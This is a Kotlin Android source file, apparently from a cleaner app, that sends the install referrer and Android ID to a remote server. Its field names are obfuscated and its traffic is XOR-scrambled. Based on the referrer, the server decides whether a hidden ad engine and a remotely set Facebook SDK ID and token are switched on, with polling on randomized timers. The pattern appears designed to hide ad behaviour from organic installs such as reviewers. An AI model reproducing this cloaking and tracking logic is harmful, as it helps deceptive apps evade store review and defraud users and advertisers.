package com.ak.impI

import android.content.Context
import android.util.Base64
import ad.AdE
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import kotlin.random.Random

/**
 * Date：2025/7/25
 * Describe:
 */
class AdminCheck(val url: String) {
    private var mIoScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var laTF = 0L
    private var mRef: String = ""
    private var mOkClient = OkHttpClient()
    private var tPeriod = 40000L
    private var mS: String = ""

    fun cr(context: Context) {
        mRef = Core.getStr(Constant.KEY_REF)
        if (mRef.isBlank()) {
            checkTask(context)
        } else {
            Core.e.d(mRef)
            reConfig()
        }
    }

    private fun checkTask(context: Context) {
        if (mRef.isNotBlank()) return
        fR(context)
        ioTask(Random.nextLong(17000, 20000)) {
            checkTask(context)
        }
    }

    private fun fR(context: Context) {
        val referrerClient = InstallReferrerClient.newBuilder(context).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(p0: Int) {
                try {
                    if (p0 == InstallReferrerClient.InstallReferrerResponse.OK) {
                        val response: ReferrerDetails = referrerClient.installReferrer
                        mRef = response.installReferrer
                        Core.saveC(Constant.KEY_REF, mRef)
                        Core.e.d(mRef)
                        reConfig()
                        referrerClient.endConnection()
                    } else {
                        referrerClient.endConnection()
                    }
                } catch (_: Exception) {
                    referrerClient.endConnection()
                }
            }

            override fun onInstallReferrerServiceDisconnected() = Unit
        })
    }


    private fun reConfig() {
        val con = Core.getStr(Constant.KEY_CONFIGURE)
        if (con.isBlank()) {
            fetch(5)
        } else {
            refreshLastConfigure(con)
            if (mS == "a") {
                ioTask(Random.nextLong(1000, 60000 * 10)) {
                    fetch(1)
                }
            } else {
                bz()
            }
        }
    }

    private fun fetch(num: Int = 5) {
        if (System.currentTimeMillis() - laTF < tPeriod) return
        laTF = System.currentTimeMillis()
        val t = "${System.currentTimeMillis()}"
        val c = mapStr(a0(mRef), t)
        val str = (Base64.encodeToString(c.toByteArray(), Base64.DEFAULT))
        val req = Request.Builder().post(
            str.toRequestBody("application/json".toMediaType())
        ).url(url).addHeader(Constant.d, t).build()
        requestAdmin(req, num)
    }

    private fun mapStr(origin: String, keyT: String): String {
        return origin.mapIndexed { index, c ->
            (c.code xor keyT[index % 13].code).toChar()
        }.joinToString("")
    }

    private fun requestAdmin(request: Request, num: Int) {
        Core.pE("config_R")
        mOkClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                if (num > 0) {
                    Core.pE("config_G", "error_net")
                    ioTask(10000) {
                        requestAdmin(request, num - 1)
                    }
                } else {
                    requestOver("timeout")
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                val code = response.code
                if (code == 200) {
                    val res = dateSync(body, response.headers[Constant.d] ?: "")
                    if (res.isBlank()) {
                        requestOver("null")
                    } else {
                        refreshLastConfigure(res)
                        bz()
                        Core.pE("config_G", mS)
                    }
                } else {
                    if (num > 0) {
                        Core.pE("config_G", "${response.code}")
                        ioTask(90000) {
                            requestAdmin(request, num - 1)
                        }
                    } else {
                        requestOver("timeout")
                    }
                }
            }
        })
    }

    private fun requestOver(result: String) {
        Core.pE("config_G", result)
        if (mS.isBlank()) {
            ioTask(20000) {
                fetch(3)
            }
        } else {
            bz()
        }
    }

    private fun dateSync(body: String, time: String): String {
        if (body.isBlank() || time.isBlank()) return ""
        try {
            val js = mapStr(String(Base64.decode(body, Base64.DEFAULT)), time)
            return JSONObject(js).optJSONObject(details)?.getString("conf") ?: ""
        } catch (_: Exception) {
        }
        return ""
    }

    private fun refreshLastConfigure(string: String) {
        try {
            JSONObject(string).apply {
                val s = optString("type_name")
                if (s.contains("A")) {
                    mS = "a"
                } else if (s.contains("B")) {
                    if (mS == "a") {
                        return
                    }
                    mS = "k.b.b"
                }
                Core.mustPostLog = optString("must_name_event")
                Core.isPostLog = s.contains("C_L").not()
                Core.saveC(Constant.KEY_CONFIGURE, string)
                e1(optString("facebook_id"), optString("fb_token"))
                val timeStr = optString("time_configure")
                val timeList = timeStr.split("-")
                cheAT = timeList[0].toInt() * 60000L
                cheBT = timeList[1].toInt() * 1000L
                if (mS == "a") {
                    AdE.reConfig(this)
                    if (go.not()) {
                        go = true
                        AdE.a2()
                    }
                }
            }
        } catch (e: Exception) {
            Core.pE("cf_fail", e.stackTraceToString())
        }
    }

    private var go = false

    private var cheBT = 90000L
    private var cheAT = 60000 * 60L

    private fun t0(): Long {
        tPeriod = if (mS == "a") {
            Random.nextLong(cheAT - 60000 * 5, cheAT + 60000 * 5)
        } else {
            Random.nextLong(cheBT, cheBT + 10000)
        }
        return tPeriod
    }

    private fun ioTask(delTime: Long, event: () -> Unit) {
        mIoScope.launch {
            delay(delTime)
            event.invoke()
        }
    }

    private fun bz() {
        val time = t0()
        ioTask(time) { fetch(1) }
    }

    // todo 获取外面保存的Android id key 需要修改
    private val mAndroidIdStr = Core.getStr("android_id")

    //todo 修改成Admin对应的混淆
    private val details = "glxlFgw"
    private fun a0(ref: String): String {
        val js = JSONObject().put("MyuAgKrl", "com.quickclean.sweeppurge")
            .put("IsLchUhls", Core.ver).put("bammKCRKBz", mAndroidIdStr)
            .put("zwyUQI", mAndroidIdStr).put("FvLGXvxg", ref)
        return js.toString()
    }

    private fun e1(fbStr: String, token: String) {
        if (fbStr.isBlank()) return
        if (token.isBlank()) return
        if (FacebookSdk.isInitialized()) return
        FacebookSdk.setApplicationId(fbStr)
        FacebookSdk.setClientToken(token)
        FacebookSdk.sdkInitialize(Core.mApp)
        AppEventsLogger.activateApp(Core.mApp)
    }
}